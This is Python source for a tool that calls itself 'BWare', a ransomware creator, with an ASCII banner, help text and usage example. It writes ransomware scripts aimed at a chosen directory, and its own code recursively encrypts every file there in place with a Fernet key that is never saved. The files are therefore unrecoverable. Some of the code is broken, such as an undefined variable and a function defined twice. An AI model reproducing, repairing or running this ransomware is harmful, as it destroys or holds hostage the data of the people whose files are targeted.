import os
import glob
from cryptography.fernet import Fernet
import sys

code = ''
all_dir = []
all_s_dir = []
all_s_file = []
allsd = {}

def make_ware(tdir,tfname):
    with open('./base/dflt.py') as f:
        code = f.read()
    code = code.replace("input()","'"+tdir+"'")
    f = open(str(tfname),'w')
    f.write(code)

if len(sys.argv) > 1:
    pass
else:
    os.system('clear')
    print('\033[92m'+'''
            bbbbbbbbbbbbbbbbb   W    WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   W
            bb              bb  WW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WW
            bb               bb WWW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WWW
            bb              bb  WWWW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WWWW
            bb             bb   WWWWW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WWWWW
            bbbbbbbbbbbbbbbb    WWWWWW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WWWWWW
            bbbbbbbbbbbbbbbb    WWWWWWW   WWWWWWWWWWWWWWWWWWWWWWWWWWW   WWWWWWW
            bb             bb   WWWWWWWW   WWWWWWWWWWWWWWWWWWWWWWWWW   WWWWWWWW
            bb              bb  WWWWWWWWW   WWWWWW         WWWWWWWW   WWWWWWWWW
            bb               bb WWWWWWWWWW   WWWW   WWWWW   WWWWWW   WWWWWWWWWW
            bb              bb  WWWWWWWWWWW   WW   WWWWWWW   WWWW   WWWWWWWWWWW
            bb             bb   WWWWWWWWWWWW      WWWWWWWWW   WW   WWWWWWWWWWWW
            bbbbbbbbbbbbbbbb    WWWWWWWWWWWWW   WWWWWWWWWWWW      WWWWWWWWWWWWW

    '''+'\033[0m')
    print('\033[93m'+'''
                                       Tool :- BWare
                               Tool type :- Ransomeware Creator
                                     Created by :- B2H
                        B2H's github :- https://github.com/back-2-hack
    '''+'\033[0m')

try:
    if sys.argv[1] == '--target' or sys.argv[1] == '-t' and sys.argv[3]=='-o' or sys.argv[3]=='--out':
        make_ware(sys.argv[2],sys.argv[4])
except IndexError:
    try:
        if sys.argv[1] == '-h' or sys.argv[1] == '--help':
            pass
    except:
        print('\n\033[91m'+'Plzz enter arguments correctly | -h for HELP'+'\033[0m\n')

try:
    if sys.argv[1] == '-h' or sys.argv[1] == '-help' or sys.argv[1] == '--help':
        print('''
    __________________________________________________________________________________________
    |                                                                                         |
    | -t or --target {                                                                        |
    |     Use : To set target directory                                                       |
    |     Explaination : Name of directory you want to encrypt when ransomware gets executed  |
    | }                                                                                       |
    |                                                                                         |
    | -o or --out {                                                                           |
    |      Use : Set output file                                                              |
    |      Explaination : Name of file where you want to store ransomware                     |
    |                                                                                         |
    | }                                                                                       |
    |                                                                                         |
    | Example {                                                                               |
    |    Command : python3 bware.py -t ~/Desktop/example_dir/ -o my_ransomware.py             |
    |    Explaination of command : python3 bware.py -t <Target directory> -o <Output file>    |
    | }                                                                                       |
    \_________________________________________________________________________________________/
        ''')
except:
    pass
try:
    if t_dir == '':
        print('\nPlzz enter a valid directory name...')
        sys.exit()
except:
    sys.exit()

all_s_dirs = []
target_files = []

key = Fernet.generate_key()
  
# string the key in a file
#with open('filekey.key', 'wb') as filekey:
   #filekey.write(key)

def listdirs(rootdir):
    for it in os.scandir(rootdir):
        if it.is_dir():
            listdirs(it)
            all_dir.append(it.path)


def listdirs(t_dir):
    for it in os.scandir(t_dir):
        if it.is_dir():
            listdirs(it)
            all_s_dir.append(it.path)
 
for it in os.scandir(t_dir):
    if it.is_file():
        all_s_file.append(it.path)

listdirs(t_dir)

for i in all_s_dir:
    all_s_dirs.append(i.split('sync')[-1])
all_s_dirs.append(t_dir.split('sync')[-1])

for i in all_s_dirs:
    allsd[i]=glob.glob(f"{i}/*.*")
allsd = list(allsd.values())
for i in allsd:
    for j in i:
        target_files.append(j)

all_dir = 0
all_s_dir = 0
all_s_file = 0
allsd = 0
all_s_dirs = 0


def enc_file(tfile,ekey):
    # opening the key
    key = ekey
    
    # using the generated key
    fernet = Fernet(key)
    
    # opening the original file to encrypt
    with open(tfile, 'rb') as file:
        original = file.read()

    # encrypting the file
    encrypted = fernet.encrypt(original)
    
    # opening the file in write mode and 
    # writing the encrypted data
    with open(tfile, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

for i in target_files:
    enc_file(i,key)
